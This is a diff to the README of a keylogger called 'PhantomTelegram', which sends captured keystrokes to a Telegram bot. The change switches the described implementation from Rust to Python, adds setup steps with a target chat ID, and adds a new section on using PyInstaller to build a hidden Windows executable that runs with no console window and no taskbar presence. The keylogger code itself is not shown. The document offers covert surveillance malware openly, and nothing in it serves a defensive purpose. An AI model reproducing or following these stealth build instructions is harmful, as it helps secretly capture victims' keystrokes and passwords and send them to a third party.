@@ -1,6 +1,6 @@
 # PhantomTelegram
 
-**PhantomTelegram** is a lightweight keylogger that sends captured keystrokes to a specified Telegram bot using the Telegram Bot API. It uses `rdev` for key event listening and `reqwest` for HTTP requests.
+**PhantomTelegram** is a lightweight keylogger written in Python that relays captured keystrokes to a Telegram bot.
 
 ## Features
 - Captures keystrokes and processes them.
@@ -17,12 +17,29 @@
    - Replace `BOT_TOKEN` with your Telegram bot token.
    - Replace `CHAT_ID` with your target chat ID.
 
-3. **Build and Run:**
-   - Install Rust if you don’t have it: [Rust Installation](https://www.rust-lang.org/tools/install).
-   - Run the program:
-     ```bash
-     cargo run --release
-     ```
+3. **Install Dependencies:**
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. **Run the Program:**
+   ```bash
+   python -m src.main
+   ```
+
+## Building a Hidden Windows Executable
+
+To bundle the logger into a background Windows executable that runs without a console window:
+
+1. Install [PyInstaller](https://pyinstaller.org/en/stable/):
+   ```bash
+   pip install pyinstaller
+   ```
+2. Build the executable:
+   ```bash
+   pyinstaller --onefile --noconsole --name PhantomTelegram src/main.py
+   ```
+3. The generated `dist/PhantomTelegram.exe` starts without appearing on the taskbar or showing a console window.
 
 ## License
 **PhantomTelegram** is licensed under [The Unlicense](LICENSE), so feel free to use, modify, and distribute it as you like. 
